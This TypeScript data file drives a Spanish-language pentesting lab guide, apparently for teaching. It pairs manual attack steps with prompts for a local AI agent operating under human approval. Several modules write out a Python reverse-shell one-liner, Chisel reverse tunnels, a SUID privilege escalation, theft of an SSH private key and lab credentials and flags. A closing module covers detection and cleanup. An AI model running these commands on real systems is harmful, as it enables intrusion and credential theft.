/**
 * Dataset central del laboratorio.
 * Cada módulo ahora tiene dos vistas:
 *   - `steps`     : recorrido manual paso a paso (lo que el alumno hace en Attacker-PC).
 *   - `csai`      : misma misión replicada con CyberStrikeAI + Ollama local.
 * Los `spoiler` están ocultos detrás de un botón y muestran flags, credenciales
 * o soluciones para uso docente.
 */

export type Network = {
  id: string;
  cidr: string;
  description: string;
  hosts: Array<{
    name: string;
    ip: string;
    role: string;
    visible: boolean;
  }>;
};

export type Step = {
  id: string;
  title: string;
  description: string;
  commands?: Array<{ as?: string; code: string; explanation?: string }>;
  hint?: string;
  spoiler?: { label: string; content: string };
};

export type CSAIBlock = {
  id: string;
  title: string;
  description: string;
  /** Prompt listo para pegar en CyberStrikeAI. */
  prompt: string;
  /** Comprobación esperada (qué debería responder o qué herramientas debería invocar). */
  expect: string;
  hint?: string;
};

export type CSAIWorkflow = {
  /** Setup previo: rol, modelo y conexión recomendada. */
  role: string;
  model: string;
  /** Bloques que el alumno ejecuta dentro de la consola CSAI. */
  blocks: CSAIBlock[];
};

export type Module = {
  id: string;
  number: string;
  title: string;
  subtitle: string;
  team: "intro" | "red" | "purple" | "blue";
  estMin: number;
  goals: string[];
  steps: Step[];
  csai?: CSAIWorkflow;
};

export const NETWORKS: Network[] = [
  {
    id: "a",
    cidr: "192.168.10.0/24",
    description: "Red del operador. Aquí viven Attacker-PC, CyberStrikeAI y la guía web.",
    hosts: [
      { name: "Attacker-PC",   ip: "192.168.10.2",  role: "Estación del operador (Kali-like)", visible: true },
      { name: "Jerry-PC",       ip: "192.168.10.3",  role: "Pivote inicial — SSH expuesto",      visible: true },
      { name: "CyberStrikeAI",  ip: "192.168.10.10", role: "Asistente IA local (Ollama)",        visible: true },
      { name: "Lab-Guide",      ip: "192.168.10.20", role: "Guía web del alumno",                visible: true },
      { name: "Ollama-Proxy",   ip: "192.168.10.30", role: "Puente TCP al Ollama del host",      visible: true },
    ],
  },
  {
    id: "b",
    cidr: "192.168.11.0/24",
    description: "Segmento corporativo intermedio, descubierto tras comprometer Jerry-PC.",
    hosts: [
      { name: "Jerry-PC",  ip: "192.168.11.2", role: "Bastion interno",        visible: false },
      { name: "Webserver", ip: "192.168.11.3", role: "Apache + wp2fac",        visible: false },
    ],
  },
  {
    id: "c",
    cidr: "192.168.12.0/24",
    description: "Subred de usuarios. Estaciones de Summer, Beth y SpaceBeth.",
    hosts: [
      { name: "Webserver",    ip: "192.168.12.2", role: "Multi-homed pivote",    visible: false },
      { name: "Summer-PC",    ip: "192.168.12.3", role: "Workstation",           visible: false },
      { name: "Beth-PC",      ip: "192.168.12.4", role: "Workstation",           visible: false },
      { name: "SpaceBeth-PC", ip: "192.168.12.5", role: "Workstation (notas)",   visible: false },
    ],
  },
  {
    id: "d",
    cidr: "192.168.13.0/24",
    description: "Tránsito hacia Server51 (sensor Maltrail).",
    hosts: [
      { name: "Webserver", ip: "192.168.13.2", role: "Multi-homed pivote", visible: false },
      { name: "Server51",  ip: "192.168.13.3", role: "Maltrail / web",     visible: false },
    ],
  },
  {
    id: "e",
    cidr: "192.168.14.0/24",
    description: "Subred restringida. Hosts Birdperson y Morty.",
    hosts: [
      { name: "Server51",       ip: "192.168.14.2", role: "Pivote",         visible: false },
      { name: "Birdperson-PC",  ip: "192.168.14.3", role: "Workstation",    visible: false },
      { name: "Morty-PC",       ip: "192.168.14.4", role: "Pivote a OT",    visible: false },
    ],
  },
  {
    id: "f",
    cidr: "192.168.100.0/24",
    description: "Zona crítica. Rick-PC mantiene el secreto del laboratorio.",
    hosts: [
      { name: "Morty-PC", ip: "192.168.100.2",  role: "Salto final",     visible: false },
      { name: "Rick-PC",  ip: "192.168.100.50", role: "Objetivo final",  visible: false },
    ],
  },
];

const HITL_REMINDER =
  "Recordá: el laboratorio mantiene la aprobación humana (HITL) activada. " +
  "El agente debe proponer comandos y vos confirmás antes de ejecutar.";

export const MODULES: Module[] = [
  {
    id: "m0",
    number: "00",
    title: "Preparación del laboratorio",
    subtitle: "Despliegue local con docker compose, Ollama y modelos recomendados",
    team: "intro",
    estMin: 20,
    goals: [
      "Tener Docker y Ollama corriendo en el host.",
      "Levantar el laboratorio con un solo comando.",
      "Confirmar que CyberStrikeAI responde con el modelo local.",
    ],
    steps: [
      {
        id: "m0-s1",
        title: "Prerrequisitos",
        description: "Instala Docker (Engine o Desktop) y Ollama en tu host. La guía está pensada para Linux, macOS o Windows con WSL2.",
        commands: [
          { as: "host", code: "docker --version && docker compose version" },
          { as: "host", code: "curl -fsSL https://ollama.com/install.sh | sh   # Linux/macOS" },
        ],
      },
      {
        id: "m0-s2",
        title: "Descargar modelos Ollama",
        description: "Modelo por defecto: llama3.1:8b. Documentamos también opciones más potentes para análisis y razonamiento.",
        commands: [
          { as: "host", code: "ollama pull llama3.1:8b" },
          { as: "host", code: "ollama pull qwen2.5-coder:7b   # opcional, fuerte en código" },
          { as: "host", code: "ollama pull deepseek-r1:7b     # opcional, reasoning extendido" },
        ],
        hint: "Si tu equipo tiene >=16GB VRAM puedes probar llama3.1:70b o deepseek-r1:14b.",
      },
      {
        id: "m0-s3",
        title: "Levantar el laboratorio",
        description: "Clona el repo, copia el .env del laboratorio y levanta el compose.",
        commands: [
          { as: "host", code: "git clone https://github.com/vtomasv/dvpe-cyberstrikeai-lab.git && cd dvpe-cyberstrikeai-lab" },
          { as: "host", code: "cp lab.env.example .env" },
          { as: "host", code: "make up    # equivalente a: docker compose up -d --build" },
        ],
      },
      {
        id: "m0-s4",
        title: "Comprobar servicios",
        description: "Cuatro puntos de entrada definen el laboratorio: la guía web (esta página), CyberStrikeAI, el escritorio del atacante por noVNC y el SSH del atacante.",
        commands: [
          { as: "host", code: "open http://localhost:8088    # guía" },
          { as: "host", code: "open http://localhost:8090    # CyberStrikeAI" },
          { as: "host", code: "open http://localhost:6080    # Attacker-PC (noVNC)" },
          { as: "host", code: "ssh -p 2222 root@127.0.0.1    # Attacker-PC SSH" },
        ],
        spoiler: {
          label: "Mostrar credenciales iniciales",
          content: [
            "noVNC (http://localhost:6080) → password VNC: kali",
            "SSH (ssh -p 2222 root@127.0.0.1) → root: toor",
            "CyberStrikeAI (http://localhost:8090) → password: lab-cyberstrike (CSAI_ACCESS_PASSWORD)",
          ].join("\n"),
        },
      },
    ],
    csai: {
      role: "Asistente DevOps / SRE",
      model: "llama3.1:8b",
      blocks: [
        {
          id: "m0-csai-1",
          title: "Verificación inicial del entorno",
          description:
            "Pedile al agente que valide qué servicios están arriba y qué puertos están publicados.",
          prompt:
            "Soy operador del laboratorio educativo DVPE × CyberStrikeAI. Verificá si los siguientes endpoints responden y dame un diagnóstico breve:\n" +
            "- http://lab-guide:80 (guía interna)\n" +
            "- http://ollama-proxy:11434/api/tags (modelos Ollama disponibles)\n" +
            "- http://CyberStrikeAI:8080/health (mi propia salud)\n" +
            "Listá modelos disponibles y avisame si llama3.1:8b no está cargado.",
          expect:
            "El agente debería invocar herramientas HTTP/curl, devolver un resumen tabular de los tres endpoints y nombrar los modelos que reportó Ollama.",
          hint: HITL_REMINDER,
        },
      ],
    },
  },
  {
    id: "m1",
    number: "01",
    title: "Reconocimiento desde el atacante",
    subtitle: "Identificar la red propia y el primer host accesible",
    team: "red",
    estMin: 15,
    goals: [
      "Mapear las interfaces y rutas del Attacker-PC.",
      "Confirmar conectividad con el primer host visible.",
    ],
    steps: [
      {
        id: "m1-s1",
        title: "Entrar al Attacker-PC",
        description: "Por noVNC abrirás un escritorio gráfico. Por SSH tendrás terminal directo.",
        commands: [
          { as: "host", code: "ssh -p 2222 root@127.0.0.1" },
        ],
      },
      {
        id: "m1-s2",
        title: "Inventario de red local",
        description: "Antes de pivotar conviene saber en qué red estás.",
        commands: [
          { as: "attacker", code: "ip -br addr" },
          { as: "attacker", code: "ip route" },
        ],
      },
      {
        id: "m1-s3",
        title: "Ping sweep en network_a",
        description: "Detecta hosts vivos en 192.168.10.0/24. Deberías ver al menos Jerry-PC.",
        commands: [
          { as: "attacker", code: "for i in $(seq 1 254); do (ping -c 1 -W 1 192.168.10.$i | grep \"bytes from\" &); done; wait" },
        ],
        spoiler: {
          label: "Hosts esperados en network_a",
          content:
            "192.168.10.2 Attacker-PC · 192.168.10.3 Jerry-PC · 192.168.10.10 CyberStrikeAI · 192.168.10.20 Lab-Guide · 192.168.10.30 ollama-proxy",
        },
      },
    ],
    csai: {
      role: "Recon Specialist",
      model: "llama3.1:8b",
      blocks: [
        {
          id: "m1-csai-1",
          title: "Pedir reconocimiento de network_a",
          description:
            "El agente puede invocar nmap/ping y devolver una tabla de hosts vivos. Aprobá cada comando antes de ejecutar.",
          prompt:
            "Estoy conectado a la red 192.168.10.0/24 desde el host atacante. Quiero un inventario de hosts vivos con tres columnas: IP, hostname (si lo deduces) y puertos TCP top-10 abiertos. " +
            "Proponé los comandos en bloque markdown y esperá mi aprobación. No ejecutes nada todavía.",
          expect:
            "El agente debería proponer un nmap -sn y luego un nmap -sT --top-ports=10 contra los vivos. Debe esperar aprobación humana.",
          hint: HITL_REMINDER,
        },
        {
          id: "m1-csai-2",
          title: "Comparar con tu ping sweep manual",
          description:
            "Pegale al agente la salida de tu ping sweep manual y pedile contraste con su escaneo.",
          prompt:
            "Esta es la salida de mi ping sweep manual:\n```\n<<pega aquí la salida>>\n```\nComparalo con tu inventario y marcá los hosts que ambos confirman versus los que sólo aparece en uno.",
          expect:
            "El agente debe devolver una tabla con tres columnas: IP, visto-manual, visto-CSAI; resaltando coincidencias y discrepancias.",
        },
      ],
    },
  },
  {
    id: "m2",
    number: "02",
    title: "Compromiso inicial: Jerry-PC",
    subtitle: "SSH sobre credenciales débiles + despliegue del toolkit",
    team: "red",
    estMin: 15,
    goals: [
      "Conseguir acceso a Jerry-PC.",
      "Subir y desplegar el toolkit propio.",
    ],
    steps: [
      {
        id: "m2-s1",
        title: "Acceso por SSH",
        description: "Jerry-PC usa credenciales triviales que la organización olvidó rotar.",
        commands: [
          { as: "attacker", code: "ssh root@192.168.10.3" },
        ],
        hint: "El usuario es 'root'. Prueba primero contraseñas obvias (nombre del host, palabras simples).",
        spoiler: {
          label: "Credencial de Jerry-PC",
          content: "root:IAmJerry",
        },
      },
      {
        id: "m2-s2",
        title: "Transferir el toolkit",
        description: "El toolkit incluye chisel, linpeas, ffuf y wordlists. En Attacker-PC vive en /root/Desktop/tools/.",
        commands: [
          { as: "attacker", code: "scp /root/toolkit.tar.gz root@192.168.10.3:/root/toolkit.tar.gz" },
          { as: "jerry",    code: "tar -xzvf /root/toolkit.tar.gz -C /root/" },
        ],
      },
    ],
    csai: {
      role: "Initial Access Operator",
      model: "llama3.1:8b",
      blocks: [
        {
          id: "m2-csai-1",
          title: "Enumerar posibles credenciales",
          description:
            "Pedile al agente que arme una lista corta y razonada de pares usuario:contraseña que probarías primero.",
          prompt:
            "Tengo un host con SSH abierto en 192.168.10.3 (hostname Jerry-PC). En contexto educativo y autorizado, proponé 8 pares usuario:contraseña a probar primero, ordenados por probabilidad y justificando cada uno en una línea.",
          expect:
            "El agente debe devolver una lista numerada con justificaciones cortas y proponer un único intento manual para iniciar (no automatizar).",
          hint: HITL_REMINDER,
        },
        {
          id: "m2-csai-2",
          title: "Generar plan de despliegue del toolkit",
          description:
            "Que sugiera la mejor manera de copiar y descomprimir tu toolkit minimizando huella.",
          prompt:
            "Acabo de comprometer Jerry-PC (192.168.10.3) con credenciales válidas. Tengo en mi atacante /root/toolkit.tar.gz (chisel, linpeas, ffuf). Proponé los comandos para copiarlo, verificar hash y descomprimirlo en /root/ minimizando logs.",
          expect:
            "El agente debe sugerir scp + sha256sum + tar y, opcionalmente, limpieza de history.",
        },
      ],
    },
  },
  {
    id: "m3",
    number: "03",
    title: "Pivote SOCKS con Chisel",
    subtitle: "Reverse SOCKS desde Jerry-PC al Attacker-PC",
    team: "red",
    estMin: 20,
    goals: [
      "Levantar un listener Chisel en el atacante.",
      "Crear un túnel reverso SOCKS5 desde Jerry-PC.",
      "Probar el túnel con proxychains.",
    ],
    steps: [
      {
        id: "m3-s1",
        title: "Listener en Attacker-PC",
        description: "Puerto 8000/tcp escucha conexiones reverse de los pivotes.",
        commands: [
          { as: "attacker", code: "/root/Desktop/tools/chisel server -p 8000 --reverse &" },
        ],
      },
      {
        id: "m3-s2",
        title: "Cliente reverse en Jerry-PC",
        description: "Solicita un SOCKS5 inverso atado al puerto 1080 del atacante.",
        commands: [
          { as: "jerry", code: "/root/chisel client 192.168.10.2:8000 R:1080:socks &" },
        ],
      },
      {
        id: "m3-s3",
        title: "Configurar proxychains",
        description: "Edita /etc/proxychains4.conf en Attacker-PC para apuntar a socks5 127.0.0.1 1080.",
        commands: [
          { as: "attacker", code: "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf" },
          { as: "attacker", code: "proxychains nmap --top-ports=20 -sT -Pn --open -sV 192.168.11.3" },
        ],
        spoiler: {
          label: "Servicio esperado en 192.168.11.3",
          content: "Apache 2.4 sirviendo wp2fac en /admin (PHP 8.1). Recordá que es internal, sin exposición al host.",
        },
      },
    ],
    csai: {
      role: "Pivoting Specialist",
      model: "qwen2.5-coder:7b",
      blocks: [
        {
          id: "m3-csai-1",
          title: "Diseñar el túnel y validarlo",
          description:
            "Que el agente te explique paso a paso cómo armar el reverse SOCKS y cómo validarlo desde el atacante.",
          prompt:
            "Quiero pivotar desde Jerry-PC (192.168.10.3, mi pivote) hacia 192.168.11.0/24. Tengo el binario chisel. Proponé: (1) comando exacto en el atacante para escuchar reverse SOCKS, (2) comando exacto en Jerry-PC, (3) prueba de validación con proxychains contra 192.168.11.3.",
          expect:
            "El agente debe entregar tres bloques de comandos diferenciados (atacante / Jerry / verificación) y enumerar las opciones críticas de chisel.",
          hint: HITL_REMINDER,
        },
        {
          id: "m3-csai-2",
          title: "Pedir un escaneo asistido vía SOCKS",
          description:
            "El agente puede orquestar nmap a través del SOCKS y devolverte un resumen.",
          prompt:
            "Con el SOCKS5 activo en 127.0.0.1:1080, ejecutá un escaneo top-50 puertos TCP contra 192.168.11.3 usando proxychains y devolveme: puertos abiertos, banners y tres rutas de explotación priorizadas.",
          expect:
            "El agente debe invocar proxychains nmap, parsear la salida y devolver tabla + plan en máx. 5 bullets.",
        },
      ],
    },
  },
  {
    id: "m4",
    number: "04",
    title: "Enumeración web a través del SOCKS",
    subtitle: "Port-forward HTTP y fuzzing dirigido con FFUF",
    team: "red",
    estMin: 20,
    goals: [
      "Exponer el Webserver al atacante mediante port-forward Chisel.",
      "Encontrar rutas ocultas con ffuf y SOCKS5.",
    ],
    steps: [
      {
        id: "m4-s1",
        title: "Port-forward dirigido",
        description: "Reexponemos el puerto 80 del Webserver como 5050 en el atacante.",
        commands: [
          { as: "jerry", code: "/root/chisel client 192.168.10.2:8000 R:5050:192.168.11.3:80 &" },
          { as: "attacker", code: "curl -I http://127.0.0.1:5050/" },
        ],
      },
      {
        id: "m4-s2",
        title: "Fuzzing con ffuf vía SOCKS",
        description: "Tres caminos: directo al port-forward o por SOCKS5. Practicamos el segundo.",
        commands: [
          { as: "attacker", code: "ffuf -w /root/Desktop/tools/directory-list-2.3-medium.txt -u http://192.168.11.3/FUZZ/ -x socks5://127.0.0.1:1080 -ic" },
        ],
        spoiler: {
          label: "Ruta sensible",
          content: "/admin → wp2fac con bypass conocido en parámetro de OTP. Documentado en el walkthrough original.",
        },
      },
    ],
    csai: {
      role: "Web Enumerator",
      model: "qwen2.5-coder:7b",
      blocks: [
        {
          id: "m4-csai-1",
          title: "Plan de enumeración web",
          description:
            "Pedile al agente un plan de enumeración con al menos dos motores (ffuf y feroxbuster) y wordlists razonadas.",
          prompt:
            "Tengo HTTP en 192.168.11.3 y SOCKS5 en 127.0.0.1:1080. Plan de enumeración web en 4 pasos: detección de tecnología, fuzzing de rutas, fuzzing de parámetros y prueba de virtual hosts. Especificá wordlists y por qué.",
          expect:
            "Plan enumerado, wordlists sensatas, sin sugerir ataques destructivos. Debe esperar aprobación.",
          hint: HITL_REMINDER,
        },
        {
          id: "m4-csai-2",
          title: "Interpretar la salida de ffuf",
          description:
            "Pegale los resultados crudos y pedí ranking de rutas a auditar primero.",
          prompt:
            "Estos son los hits de ffuf:\n```\n<<pega salida>>\n```\nDame las 5 rutas más interesantes ordenadas por riesgo y la prueba manual mínima para cada una.",
          expect: "Tabla con ruta, código HTTP, motivo, prueba siguiente.",
        },
      ],
    },
  },
  {
    id: "m5",
    number: "05",
    title: "Explotación y reverse shell",
    subtitle: "RCE en el Webserver y bind shell hacia el atacante",
    team: "red",
    estMin: 25,
    goals: [
      "Conseguir RCE sobre el Webserver.",
      "Retornar una shell completa a través del túnel.",
    ],
    steps: [
      {
        id: "m5-s1",
        title: "Listener en Jerry-PC",
        description: "Como Webserver sólo ve la red interna, el listener vive en Jerry-PC.",
        commands: [
          { as: "jerry", code: "nc -lvnp 4041" },
        ],
      },
      {
        id: "m5-s2",
        title: "Disparar reverse shell",
        description: "Después de explotar el bypass HTTP, ejecuta el oneliner con el callback hacia Jerry-PC.",
        commands: [
          { as: "attacker", code: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.11.2\",4041));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" },
        ],
      },
      {
        id: "m5-s3",
        title: "Capturar la flag del Webserver",
        description: "Verifica que tienes ejecución y captura la flag plantada.",
        commands: [
          { as: "webserver", code: "cat /root/flag.txt" },
        ],
        spoiler: {
          label: "Flag esperada",
          content: "flag{098f6bcd4621d373cade4e832627b4f6}",
        },
      },
    ],
    csai: {
      role: "Exploitation Engineer",
      model: "qwen2.5-coder:7b",
      blocks: [
        {
          id: "m5-csai-1",
          title: "Generar payload de reverse shell",
          description:
            "El agente arma un oneliner Python que apunte a Jerry-PC, lo justifica y propone alternativas.",
          prompt:
            "Necesito un reverse shell desde 192.168.11.3 hacia 192.168.11.2:4041 usando Python 3 (sin dependencias adicionales). Devolveme: oneliner principal, alternativa con bash, alternativa con socat. Explicá cuándo elegir cada uno.",
          expect:
            "Tres bloques de código, comentarios cortos en cada uno y advertencia sobre detección/IOCs.",
          hint: HITL_REMINDER,
        },
        {
          id: "m5-csai-2",
          title: "Estabilizar la shell",
          description:
            "Pedile al agente la secuencia clásica de upgrade de TTY y verificación.",
          prompt:
            "Tengo una shell reverse interactiva pero sin TTY completa. Dame los pasos exactos para upgrade (python pty, stty, export TERM) y la verificación final.",
          expect: "Lista de 4-5 comandos en orden y comprobación con `tput cols`.",
        },
      ],
    },
  },
  {
    id: "m6",
    number: "06",
    title: "Escalación de privilegios",
    subtitle: "LinPEAS, SUID y reuse de claves",
    team: "red",
    estMin: 20,
    goals: [
      "Ejecutar LinPEAS para mapear vectores.",
      "Aprovechar SUID o credenciales reutilizadas para escalar.",
    ],
    steps: [
      {
        id: "m6-s1",
        title: "Subir y ejecutar LinPEAS",
        description: "Desde Attacker-PC copia el binario a través del túnel y ejecútalo en el objetivo.",
        commands: [
          { as: "attacker",   code: "chmod +x /root/Desktop/tools/PrivEsc/linpeas_linux_amd64" },
          { as: "webserver",  code: "/tmp/toolkit/PrivEsc/linpeas_linux_amd64 -a 2>/dev/null | tee /tmp/linpeas.out" },
        ],
      },
      {
        id: "m6-s2",
        title: "Escalar con SUID",
        description: "Webserver tiene python3 con SUID, lo que permite re-exec como root.",
        commands: [
          { as: "webserver", code: "python3 -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'" },
          { as: "webserver", code: "id && cat /root/.ssh/id_rsa_home" },
        ],
        spoiler: {
          label: "Pista de reuso",
          content: "La clave SSH /root/id_rsa_home se reutiliza en Beth-PC, SpaceBeth-PC y Summer-PC.",
        },
      },
    ],
    csai: {
      role: "Privilege Escalation Analyst",
      model: "deepseek-r1:7b",
      blocks: [
        {
          id: "m6-csai-1",
          title: "Triage automatizado de LinPEAS",
          description:
            "Pegale al agente la salida de LinPEAS y pedí un triage priorizado.",
          prompt:
            "Esta es la salida resumida de LinPEAS:\n```\n<<pega la salida o un fragmento relevante>>\n```\nDevolveme las 5 vías de escalación más probables ordenadas por riesgo y por esfuerzo, y para la #1 dame el comando exacto de explotación.",
          expect:
            "Tabla con vector, riesgo, esfuerzo, comando-prueba. Marca explícita de qué es destructivo.",
          hint: HITL_REMINDER,
        },
      ],
    },
  },
  {
    id: "m7",
    number: "07",
    title: "Avance lateral con CyberStrikeAI",
    subtitle: "Asistencia IA local en Ollama para planificar y documentar",
    team: "purple",
    estMin: 25,
    goals: [
      "Iniciar sesión en la consola de CyberStrikeAI.",
      "Configurar el rol y el modelo Ollama.",
      "Pedir al agente que planifique el siguiente salto.",
    ],
    steps: [
      {
        id: "m7-s1",
        title: "Abrir la consola",
        description: "Accede a http://localhost:8090. La primera vez se solicita la contraseña definida en config.yaml.",
        commands: [
          { as: "host", code: "open http://localhost:8090" },
        ],
        spoiler: { label: "Contraseña inicial", content: "lab-cyberstrike (cambiar en producción)" },
      },
      {
        id: "m7-s2",
        title: "Confirmar la conexión con Ollama",
        description: "El proxy ollama-proxy:11434 enruta hacia el Ollama del host. Verifica desde el contenedor que responde.",
        commands: [
          { as: "host", code: "docker exec -it CyberStrikeAI curl -s http://ollama-proxy:11434/api/tags | head" },
        ],
      },
      {
        id: "m7-s3",
        title: "Prompt de planificación",
        description: "En la consola crea una conversación nueva con el rol \"Pentesting / Lateral Movement\" y pega el siguiente prompt.",
        commands: [
          {
            as: "csai",
            code: "Estás asistiendo un ejercicio autorizado en DVPE. Estoy en Webserver (192.168.11.3) tras escalación. Quiero pivotar hacia Summer-PC (192.168.12.3) sin ruido. Sugiere los próximos comandos respetando el HITL.",
          },
        ],
        hint: "El laboratorio mantiene la aprobación humana activada en herramientas ofensivas (HITL). El agente debe proponer, no ejecutar directamente.",
      },
    ],
    csai: {
      role: "Lateral Movement Strategist",
      model: "llama3.1:8b",
      blocks: [
        {
          id: "m7-csai-1",
          title: "Plan de salto Webserver → Summer-PC",
          description:
            "El agente arma el plan completo (descubrimiento, autenticación, persistencia opcional) usando el toolkit ya desplegado.",
          prompt:
            "Estoy en Webserver (192.168.11.3) como root. Quiero saltar a Summer-PC (192.168.12.3). Tengo /root/id_rsa_home. Plan en 4 pasos: validación de ruta, intento de auth, validación post-login, plan de salida. Incluí los comandos exactos.",
          expect:
            "Cuatro pasos numerados con comandos concretos y validación de éxito en cada uno.",
          hint: HITL_REMINDER,
        },
        {
          id: "m7-csai-2",
          title: "Pedir un mini-informe de actividad",
          description:
            "Que CSAI documente lo que ya hiciste en formato listo para pegar en el informe final.",
          prompt:
            "Generá un mini-informe (máx 200 palabras) con: hosts comprometidos, técnicas MITRE ATT&CK relevantes, evidencias clave y pendientes de Blue Team. Tono ejecutivo, en español.",
          expect:
            "Texto corto en español con bullets y referencias MITRE (T-IDs).",
        },
      ],
    },
  },
  {
    id: "m8",
    number: "08",
    title: "Doble pivote: hacia network_e y network_f",
    subtitle: "De Webserver → Server51 → Morty-PC → Rick-PC",
    team: "red",
    estMin: 30,
    goals: [
      "Encadenar túneles Chisel y proxychains para alcanzar redes profundas.",
      "Capturar la flag final de Rick-PC.",
    ],
    steps: [
      {
        id: "m8-s1",
        title: "Saltar a Server51",
        description: "Reutilizá la clave SSH encontrada en Webserver para autenticarte en Server51.",
        commands: [
          { as: "webserver", code: "ssh -i /root/id_rsa_home root@192.168.13.3" },
        ],
      },
      {
        id: "m8-s2",
        title: "Encadenar otro chisel",
        description: "Desde Server51 levanta un nuevo cliente Chisel apuntando a Jerry-PC para extender el SOCKS hacia 192.168.14.0/24.",
        commands: [
          { as: "server51", code: "./chisel client 192.168.13.2:8000 R:1180:socks &" },
          { as: "attacker", code: "echo 'socks5 127.0.0.1 1180' >> /etc/proxychains4.conf" },
        ],
      },
      {
        id: "m8-s3",
        title: "Compromiso de Morty-PC y Rick-PC",
        description: "Repite reconocimiento, explotación y escalación contra Morty-PC; luego desde allí alcanza la red 192.168.100.0/24 y aterriza en Rick-PC.",
        commands: [
          { as: "attacker", code: "proxychains -q nmap --top-ports=50 -sT -Pn 192.168.14.4" },
          { as: "morty",    code: "ssh -i /root/id_rsa_home root@192.168.100.50" },
          { as: "rick",     code: "cat /root/flag.txt" },
        ],
        spoiler: {
          label: "Flag final",
          content: "flag{36d80ec698b0c198a1106f26c9e07a4} — punto final del recorrido.",
        },
      },
    ],
    csai: {
      role: "Multi-Pivot Operator",
      model: "qwen2.5-coder:7b",
      blocks: [
        {
          id: "m8-csai-1",
          title: "Diagrama mental del doble pivote",
          description:
            "Pedile al agente un diagrama ASCII del encadenamiento de túneles.",
          prompt:
            "Dibujá en ASCII el siguiente flujo: Attacker (192.168.10.2) ←socks5:1080— Jerry (192.168.10.3 / 192.168.11.2) ←ssh— Webserver (192.168.11.3 / 192.168.13.2) →ssh→ Server51 (192.168.13.3 / 192.168.14.2) ←socks5:1180— de vuelta al atacante. Explicá en una frase cada flecha.",
          expect:
            "ASCII art legible con etiquetas y leyenda corta.",
        },
        {
          id: "m8-csai-2",
          title: "Plan de salto a Rick-PC",
          description:
            "Que el agente proponga el camino más corto a 192.168.100.50 minimizando comandos.",
          prompt:
            "Estoy en Server51 con SOCKS5 hacia 192.168.14.0/24. Quiero llegar a Rick-PC (192.168.100.50). Proponé el camino más corto: cuántos saltos, qué túneles adicionales y qué credenciales reutilizar. Marcá los puntos donde necesitás mi confirmación.",
          expect:
            "Plan numerado con saltos, comandos por salto y checkpoints HITL claros.",
          hint: HITL_REMINDER,
        },
      ],
    },
  },
  {
    id: "m9",
    number: "09",
    title: "Visión Blue Team",
    subtitle: "Detección, mitigación y limpieza posterior al ejercicio",
    team: "blue",
    estMin: 25,
    goals: [
      "Revisar evidencias en Server51 (Maltrail).",
      "Identificar IOC asociados al pivoting Chisel.",
      "Proponer hardening y limpiar el laboratorio.",
    ],
    steps: [
      {
        id: "m9-s1",
        title: "Inspeccionar Maltrail en Server51",
        description: "El sensor expone su panel en http://localhost:8081 (Server51).",
        commands: [
          { as: "host", code: "open http://localhost:8081" },
        ],
      },
      {
        id: "m9-s2",
        title: "Buscar IOC en pcaps/logs",
        description: "Patrones útiles: handshakes Chisel, conexiones reverse SOCKS y user-agents anómalos en Apache.",
        commands: [
          { as: "host", code: "docker exec -it Webserver tail -n 200 /var/log/apache2/access.log" },
          { as: "host", code: "docker exec -it Jerry-PC tcpdump -nn -i eth0 'tcp port 8000' -c 50" },
        ],
      },
      {
        id: "m9-s3",
        title: "Recomendaciones",
        description: "Documenta tres controles concretos: rotación de credenciales, segmentación con políticas de salida y monitoreo de túneles HTTP reversos.",
        hint: "Pide al agente CyberStrikeAI un informe ejecutivo del ejercicio en español usando los logs anteriores como evidencia.",
      },
      {
        id: "m9-s4",
        title: "Limpieza",
        description: "Cuando termines, derriba el laboratorio para liberar recursos.",
        commands: [
          { as: "host", code: "make down" },
          { as: "host", code: "make clean    # opcional: elimina también volúmenes" },
        ],
      },
    ],
    csai: {
      role: "Blue Team Analyst",
      model: "deepseek-r1:7b",
      blocks: [
        {
          id: "m9-csai-1",
          title: "Detectar IOCs del ejercicio",
          description:
            "Pegale los logs de Apache y la captura tcpdump y pedí extraer IOCs.",
          prompt:
            "Acá tenés evidencia recolectada del ejercicio (logs Apache + tcpdump):\n```\n<<pega evidencia>>\n```\nExtraé IOCs en formato tabla: tipo, valor, fuente, técnica MITRE.",
          expect:
            "Tabla CSV-friendly con al menos 6 IOCs (IPs, puertos, user-agents, hashes, comandos sospechosos).",
        },
        {
          id: "m9-csai-2",
          title: "Informe ejecutivo final",
          description:
            "Cierre del ejercicio con plan de remediación priorizado.",
          prompt:
            "Generá un informe ejecutivo en español (máx 350 palabras) con: resumen, cadena de ataque, top-5 hallazgos por riesgo, recomendaciones priorizadas (corto/medio/largo plazo). Tono CISO.",
          expect:
            "Texto formal en español, sin jerga innecesaria, con secciones claras.",
        },
      ],
    },
  },
];

export const TEAM_LABEL: Record<Module["team"], { label: string; color: string }> = {
  intro:  { label: "Setup",      color: "oklch(0.70 0.17 215)" },
  red:    { label: "Red team",   color: "oklch(0.68 0.22 25)"  },
  purple: { label: "AI assist",  color: "oklch(0.66 0.18 290)" },
  blue:   { label: "Blue team",  color: "oklch(0.70 0.17 215)" },
};

export const SHELL_LABEL: Record<string, string> = {
  host: "host",
  attacker: "Attacker-PC",
  jerry: "Jerry-PC",
  webserver: "Webserver",
  server51: "Server51",
  morty: "Morty-PC",
  rick: "Rick-PC",
  csai: "CyberStrikeAI",
};
